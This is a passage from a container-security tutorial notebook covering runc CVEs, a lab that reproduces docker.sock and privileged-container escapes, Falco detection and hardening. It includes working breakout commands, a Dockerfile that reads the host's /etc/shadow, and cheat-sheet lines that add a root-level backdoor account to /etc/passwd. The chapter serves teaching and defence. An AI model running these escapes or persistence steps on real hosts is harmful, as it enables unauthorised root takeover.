  >> /mnt/etc/crontab
```

The `core_pattern` trick deserves a note: if the **host's** `/proc/sys/kernel/core_pattern` is writable (host `/proc` mounted, or privileged), setting it to `|/path/to/script` makes the kernel run that script as root whenever any process on the host crashes — trigger a crash and you have host root.

### 9.3 CVE-2019-5736 — overwriting the host `runc` binary

**Mechanism:** when you `docker exec` into a running container, the host's `runc` binary re-executes itself inside the container's namespaces via `/proc/self/exe`. A malicious container process can, at the moment of exec, overwrite the host's `runc` binary by writing to `/proc/self/exe` (the host's runc file descriptor). The next time *any* container is started or exec'd, the host runs the attacker's replaced `runc` — as root, on the host.

```mermaid
sequenceDiagram
    participant A as Attacker process in container
    participant R as Host runc (/proc/self/exe)
    participant H as Host
    A->>A: Replace container /bin/sh with #!/proc/self/exe shim
    Note over A: Wait for admin to `docker exec`
    A->>R: On exec, open /proc/self/exe (host runc fd)
    A->>R: Overwrite host runc binary with payload
    R->>H: Next container start runs attacker code as root
```

Patched in runc 1.0-rc7 / Docker 18.09.2 by copying the runc binary into a memfd before re-exec. It remains a superb teaching example of how a bug in the *isolation setup code itself* breaks everything. **Preconditions:** attacker controls the image or has write access inside the container, and an admin (or automation) execs into or starts it.

### 9.4 CVE-2024-21626 — "Leaky Vessels" runc file-descriptor leak

**Mechanism:** runc 1.1.11 and earlier leaked an open file descriptor pointing at the **host's** filesystem (specifically an fd to `/sys/fs/cgroup` left open across the container setup) into the container. A crafted image whose `WORKDIR` is set to `/proc/self/fd/<n>` (the leaked fd) lands the container's initial process with its working directory *on the host filesystem*. From there the process can `cd ../../../` out to the host root and read/write host files as root.

```dockerfile
# Malicious image demonstrating the concept (patched runc rejects this)
FROM alpine
WORKDIR /proc/self/fd/9    # the leaked host fd
RUN cd ../../../ && cat etc/shadow    # reads HOST /etc/shadow at build/run
```

Fixed in runc 1.1.12. It shipped alongside sibling "Leaky Vessels" bugs (CVE-2024-23651/23652/23653 in BuildKit). The defensive takeaway: **keep runc/containerd/BuildKit patched** — the runtime is security-critical code, and image-triggered escapes mean you can be hit just by pulling and running a malicious public image.

### 9.5 Kernel exploits — the last resort

Because the container shares the host kernel, any local-privilege-escalation kernel bug reachable from inside the container (e.g. Dirty Pipe CVE-2022-0847, Dirty COW CVE-2016-5195, an nf_tables UAF) escalates container-root (or even container-non-root) to host-root, unless seccomp blocks the required syscall. This is why the default seccomp profile — which blocks obscure, rarely-needed syscalls that are common exploit entry points — is a meaningful control, and why `seccomp=unconfined` is dangerous even without other misconfig.

**CTF angle:** boxes like HackTheBox's older container challenges and many TryHackMe "container escape" rooms are solved by exactly this decision tree — enumerate with `amicontained`/`capsh`, spot the one enabled primitive (mounted socket, `SYS_ADMIN`, host mount), and take the matching path above.

---

## Part 10: Hands-On Lab — Scan, Detect, Break Out, Defend

A single reproducible lab that exercises the whole chapter on a host you own. **Do this only on your own machine.**

### Setup

```bash
# A throwaway VM or your Kali box with Docker installed
docker --version
mkdir ~/docker-lab && cd ~/docker-lab
```

### Step 1 — Build a deliberately-leaky image and scan it

```dockerfile
# Dockerfile.vuln
FROM python:3.9-slim
# (1) a secret that will persist in a layer even after "removal"
COPY secret.env /app/secret.env
RUN rm /app/secret.env
# (2) run as root, no healthcheck, old base — all flagged by trivy
COPY app.py /app/app.py
CMD ["python", "/app/app.py"]
```

```bash
echo "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" > secret.env
echo "print('hello')" > app.py
docker build -f Dockerfile.vuln -t leaky:1.0 .

# Recover the "deleted" secret from the layer:
docker save leaky:1.0 -o leaky.tar && mkdir img && tar -xf leaky.tar -C img
grep -rI "AWS_SECRET" img/ && echo "[!] secret recovered from image layer"

# Scan it:
trivy image --scanners vuln,secret,misconfig --severity HIGH,CRITICAL leaky:1.0
# Expect: HIGH/CRITICAL OS CVEs + a 'secret' finding for the AWS key.
```

### Step 2 — Reproduce the docker.sock escape (lab)

```bash
# Start a container WITH the socket mounted (the misconfig)
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock \
  docker:cli sh

# --- now "inside" the container ---
ls -la /var/run/docker.sock                      # present
docker run -it --rm -v /:/host --privileged alpine \
  chroot /host sh -c 'id; hostname; head -1 /etc/shadow'
# You are root on the host filesystem. Escape proven.
exit
```

### Step 3 — Reproduce the privileged host-disk escape (lab)

```bash
docker run --rm -it --privileged alpine sh
# inside:
apk add --no-cache util-linux >/dev/null
fdisk -l | grep -E '/dev/(sd|vd|nvme)'           # find host disk, e.g. /dev/vda1
mkdir /hostfs && mount /dev/vda1 /hostfs && ls /hostfs/root && umount /hostfs
```

### Step 4 — Detect the escape with Falco (blue team)

```bash
# Run Falco as a container watching the host (lab)
docker run --rm -i -t --privileged \
  -v /var/run/docker.sock:/host/var/run/docker.sock \
  -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro \
  -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro \
  falcosecurity/falco:latest

# Re-run Step 2/3 in another terminal and watch Falco fire:
# 14:22:31.telemetry Notice Container with sensitive mount started
#   (image=alpine mounts=/:/host)
# 14:22:33.telemetry Warning Shell spawned in container with host root mount
```

### Step 5 — Harden and re-verify

```bash
# Rebuild leaky:1.0 the right way (multi-stage, non-root, .dockerignore)
printf '.git\n*.env\n*.pem\n.aws\n' > .dockerignore
# ... rewrite Dockerfile per Part 6 ...
docker build -t hardened:1.0 .
trivy image --exit-code 1 --severity HIGH,CRITICAL --ignore-unfixed hardened:1.0 \
  && echo "[+] gate passed"

# Run it with the hardened flag set and confirm the escape now fails:
docker run --rm -it --cap-drop=ALL --security-opt no-new-privileges \
  --read-only --user 10001:10001 hardened:1.0 \
  sh -c 'mount 2>&1 | head; echo "mount denied = good"'
```

**What the lab proves end-to-end:** secrets persist in layers (Step 1), the socket and `--privileged` are each a full host takeover (Steps 2–3), those actions are *detectable* at runtime (Step 4), and the same workload run with capabilities dropped and no dangerous mounts cannot escape (Step 5). That arc — vulnerable → exploit → detect → harden → verify — is the reusable pattern for every control in this chapter.

---

## Part 11: Runtime Security, Rootless Docker & Orchestration Notes

Image scanning is build-time. The escapes in Part 9 happen at runtime. Closing the loop needs runtime controls.

### Rootless Docker and userns-remap

Two ways to make "root in the container" stop meaning "root on the host":

- **userns-remap:** enable the user namespace daemon-wide so container UID 0 maps to an unprivileged host UID. Edit `/etc/docker/daemon.json`:

```json
{ "userns-remap": "default" }
```

Then `systemctl restart docker`. Now a process that is root inside the container is, say, host UID 231072 — it cannot touch host root files even if it escapes the mount namespace. The trade-off: some volume-permission friction and a few incompatible features (`--privileged` and some `--net=host` cases).

- **Rootless Docker:** run the *entire daemon* as a non-root user (`dockerd-rootless-setuptool.sh install`). Even a daemon compromise is contained to that user. This is the strongest posture for single-node Docker and is the direction the ecosystem is moving (Podman is rootless by default).

### Podman — the daemonless alternative

**Podman** runs containers without a central root daemon (no `docker.sock` to steal) and is rootless by default. If your threat model is dominated by the Part 7 socket risk, Podman removes that class of attack outright. It is CLI-compatible (`alias docker=podman` works for most workflows).

### Runtime sandboxes — gVisor and Kata

For workloads running untrusted code (multi-tenant SaaS, CI for arbitrary PRs), namespace-based isolation may not be enough. Two options add a real boundary:

| Runtime | Mechanism | Trade-off |
|---------|-----------|-----------|
| **gVisor** (`runsc`) | User-space kernel intercepts syscalls; container never talks to the host kernel directly | ~small syscall overhead; some compatibility gaps |
| **Kata Containers** | Each container in a lightweight VM (real hypervisor boundary) | Higher memory/startup cost; near-VM isolation |

Both slot in as an OCI runtime (`--runtime=runsc`). They turn the "shared kernel" problem — the root cause of every Part 9 escape — into "shared hypervisor", which is a far harder boundary to cross.

### Kubernetes-adjacent notes

Most containers run under Kubernetes, where the same primitives resurface as **SecurityContext** and **Pod Security Standards**:

- `securityContext.privileged: true`, `hostPID`, `hostNetwork`, `hostPath` volumes — the Part 7–9 breakout conditions, now in YAML. Enforce the **Restricted** Pod Security Standard to forbid them.
- **Admission control** (OPA/Gatekeeper, Kyverno) rejects manifests that request privilege or mount `docker.sock`/host paths — the cluster-level equivalent of a Trivy CI gate.
- Scan images in-cluster with `trivy k8s cluster --report summary`.

The through-line: the kernel primitives from Part 1 are the *same* whether you spell them as `docker run` flags, a Compose file, or a Kubernetes SecurityContext. Learn them once.

---

## Part 12: Detection & Defense Angle

Consolidating the defensive controls scattered through the chapter into one operational picture. Container defence spans supply chain, host, and runtime.

### Supply-chain and build-time controls

- **Scan every image in CI** with Trivy and **fail on fixable HIGH/CRITICAL** (Part 5). Also `trivy config` your Dockerfiles/manifests to catch `privileged`, host mounts, and root-user misconfig before deploy.
- **Sign images** with `cosign` and **verify signatures at admission** so only images your pipeline built can run. This blocks the "someone pushed a poisoned image" and typosquat vectors.
- **Pin bases by digest** and rebuild regularly so CVE fixes actually land.
- **Generate and store SBOMs** (`trivy image --format cyclonedx`) so that when the next Log4Shell drops you can query "which running images contain this package?" in minutes.

### Host hardening

- Enable **userns-remap** or **rootless/Podman**; treat the `docker` group as root.
- Keep **runc, containerd, Docker/BuildKit patched** — CVE-2019-5736 and CVE-2024-21626 are image-triggered escapes.
- Keep the **default seccomp and AppArmor/SELinux profiles on**; never `--privileged`, `--security-opt seccomp=unconfined`, or `apparmor=unconfined` in production.
- Prefer **cgroup v2** (kills the release_agent escape) and a **read-only root FS** with `no-new-privileges`.

### Runtime detection

**Falco** is the open-source standard for container runtime detection. It taps syscalls (via eBPF or a kernel module) and alerts on suspicious behaviour. High-value rules for this chapter's attacks:

| Behaviour to detect | Signal |
|---------------------|--------|
| Container started with sensitive mount | `Binds` contains `/`, `/etc`, `/root`, or `docker.sock` |
| Shell spawned in a container | `execve` of `sh`/`bash` where the image shouldn't have one |
| Write below `/proc/sys` or to `release_agent` | cgroup escape attempt |
| `mount` syscall inside a container | Host-disk mount attempt (Part 8) |
| Package manager run at runtime | `apk add`/`apt install` in a running container = attacker tooling up |
| Outbound connection from an unexpected process | C2 beacon from a workload |
| Write to `/proc/*/exe` | CVE-2019-5736 runc-overwrite attempt |

Complementary host telemetry: **auditd** rules on `mount`, `ptrace`, and `finit_module`; **osquery** for container inventory and drift; and Docker daemon audit logs. Ship all of it to the SIEM and map the alerts to MITRE ATT&CK — the relevant techniques are **T1610 (Deploy Container)**, **T1611 (Escape to Host)**, **T1612 (Build Image on Host)**, and **T1613 (Container and Resource Discovery)**.

```mermaid
flowchart LR
    subgraph Build
      A[trivy image/config] --> B[cosign sign]
    end
    subgraph Admit
      B --> C[Signature + policy verify]
    end
    subgraph Run
      C --> D[seccomp/AppArmor/caps-drop]
      D --> E[Falco + auditd runtime alerts]
      E --> F[SIEM / ATT&CK mapping]
    end
```

**IR use case:** on a suspected container compromise, snapshot the container (`docker export`), pull the image and `dive`/`trivy` it for the initial vector, review Falco/auditd for the `execve`+`mount`/`docker.sock` sequence, and check the host for new SSH keys, cron entries, and `authorized_keys` writes — the standard escape footprints from Part 9.

---

## Final Revision / Summary

- **A container is a process, not a VM.** It shares the host kernel; containment is namespaces + cgroups + capabilities + seccomp + an LSM. Break or disable any layer and the boundary weakens; `--privileged` disables most at once.
- **The default user namespace is OFF** in Docker, so root-in-container is real root — which is why so many escapes begin from container root.
- **Layers are immutable and additive.** A `RUN rm` never removes a secret from an earlier layer; recover it with `docker save`/`dive`.
- **Trivy** scans images, filesystems, repos, and configs for CVEs, secrets, and misconfigurations. Gate CI with `--exit-code 1 --severity HIGH,CRITICAL --ignore-unfixed`.
- **Harden images:** minimal/distroless pinned base, multi-stage builds, non-root `USER`, BuildKit secret mounts, `.dockerignore`, drop capabilities, read-only FS, `no-new-privileges`.
- **The three great runtime misconfigurations** are the mounted **docker.sock** (passwordless host root), **`--privileged`** (all caps + host devices → mount the host disk), and **sensitive host mounts** (`/`, `/etc`, host `/proc`). Each is a full host takeover.
- **Runtime CVEs matter:** the cgroup `release_agent` escape (needs `CAP_SYS_ADMIN`), CVE-2019-5736 (runc overwrite), and CVE-2024-21626 (Leaky Vessels fd leak) — patch runc/containerd/BuildKit.
- **Defence in depth:** scan + sign + admit + drop privileges + Falco/auditd runtime detection + rootless/userns/gVisor/Kata for stronger boundaries. Map alerts to ATT&CK T1610–T1613.

## Cheat Sheet / Quick Reference

```bash
# ---------- ENUMERATE CONTAINMENT (from inside a container) ----------
cat /proc/1/cgroup; ls -la /.dockerenv        # am I in a container?
grep CapEff /proc/self/status                 # capability bitmask
capsh --decode=<hex>                          # decode capabilities
./amicontained                                # caps, seccomp, ns, apparmor
mount | grep -E 'sd|vd|nvme'                  # host disk visible?
ls -la /var/run/docker.sock                   # socket mounted?
env; ls -la / /root /etc 2>/dev/null          # sensitive host mounts?

# ---------- IMAGE INSPECTION ----------
docker history --no-trunc IMAGE               # build recipe
docker save IMAGE -o img.tar && tar -xf img.tar -C img   # unpack layers
dive IMAGE                                     # interactive layer explorer
grep -rI "PRIVATE KEY\|AKIA\|password" img/    # recover leaked secrets

# ---------- TRIVY ----------
trivy image IMAGE                              # scan an image for CVEs
trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 IMAGE
trivy fs --scanners vuln,secret,misconfig .    # scan a source tree
trivy config .                                 # lint Dockerfile/K8s/TF
trivy repo https://github.com/org/app          # scan a remote repo
trivy image --format cyclonedx -o sbom.json IMAGE   # SBOM

# ---------- BREAKOUT PRIMITIVES (LAB ONLY) ----------
# docker.sock -> host root:
docker -H unix:///var/run/docker.sock run -it -v /:/host --privileged alpine chroot /host sh
# privileged -> mount host disk:
mount /dev/sda1 /mnt/host && chroot /mnt/host sh
# host /etc mounted -> persistence:
echo 'root2:$6$...:0:0::/root:/bin/bash' >> /mnt/etc/passwd

# ---------- HARDENED RUN ----------
docker run --read-only --cap-drop=ALL --cap-add=NET_BIND_SERVICE \
  --security-opt no-new-privileges --pids-limit=200 \
  --memory=512m --user 10001:10001 --tmpfs /tmp IMAGE
```

| Misconfig to hunt for | One-line check | Fix |
|-----------------------|----------------|-----|
| Mounted docker.sock | `ls /var/run/docker.sock` | Remove; use socket-proxy/Kaniko |
| Privileged | `capsh --print \| grep sys_admin` | `--cap-drop=ALL`, no `--privileged` |
| Root in container | `id` | `USER` non-root / userns-remap |
| Host FS mount | `mount \| grep ' / '` | Remove host bind mounts |
| seccomp off | `grep Seccomp /proc/1/status` (0=off) | Keep default profile |
| Old runc | `runc --version` | Patch ≥1.1.12 |

## Common Pitfalls

- **Thinking a container is a security boundary like a VM.** It is not — plan for escape and keep the host patched.
- **"I deleted the secret in the next line."** The layer still holds it. Use BuildKit secret mounts or multi-stage builds.
- **Mounting docker.sock "just for CI."** That CI container is root on the node. Use rootless BuildKit/Kaniko or a scoped socket-proxy.
- **Running Trivy once, manually.** Scanning that doesn't gate CI and doesn't re-run as new CVEs are published gives false comfort. Automate and re-scan.
- **`--privileged` to "make it work."** It almost always means a missing device or capability; grant the *specific* one, never all of them.
- **Ignoring `affected` (no-fix) CVEs entirely vs. blocking on them.** Triage: `--ignore-unfixed` for gating, but track no-fix criticals for compensating controls.
- **Forgetting runtime.** A perfectly scanned image run `--privileged` is still a trivial host takeover. Build-time and runtime controls are both required.

## Practice Labs & Resources

- **PortSwigger / general web** — not applicable; this topic is container-native. Use the container-specific ranges below instead.
- **TryHackMe** — *"The Docker Rodeo"*, *"Intro to Docker"*, and *"Container Vulnerabilities"* / *"Docker-Rodeo"* rooms walk image scanning and the socket/privileged escapes hands-on.
- **HackTheBox** — machines and Pro Labs featuring container pivots; the *Docker* and *Kubernetes* Fortress/Endgame-style content and any box where a mounted socket or privileged container is the escalation step.
- **`madhuakula/kubernetes-goat`** — deliberately-vulnerable Kubernetes cluster with scenarios for `docker.sock` mounting, privileged pods, sensitive host mounts, and container escapes — the single best hands-on range for this chapter's runtime attacks.
- **`bkimminich/juice-shop`** and other apps — practise Trivy image/`fs` scanning against a real, CVE-rich codebase.
- **Container Security learning** — *`controlplaneio/simulator`* (CNCF-adjacent Kubernetes attack simulator) and the *Falco* "event generator" (`falcosecurity/event-generator`) to trigger and observe detections from Part 12.
- **Trivy docs** — work through image, `fs`, `config`, `k8s`, and SBOM modes against your own images; wire the CI gate into a personal repo.
- **`genuinetools/amicontained`** and **`wagoodman/dive`** — run them against every image you build to internalise capability sets and layer contents.
- **PwnKit / Dirty Pipe / Dirty COW** kernel-LPE labs (on throwaway VMs) — to see why a shared kernel makes host patching non-negotiable for container hosts.

Build the Part 10 lab once end-to-end, then repeat Steps 2–4 with each hardening control toggled on in turn — watching an escape that worked a moment ago start failing is the fastest way to make these primitives stick.

---

*Also on [Praneeth's portfolio](https://ping-praneeth.vercel.app/notebook/cloud-security/06-docker-security-image-scanning-trivy-and-container-breakouts), with comments and the latest edits.*
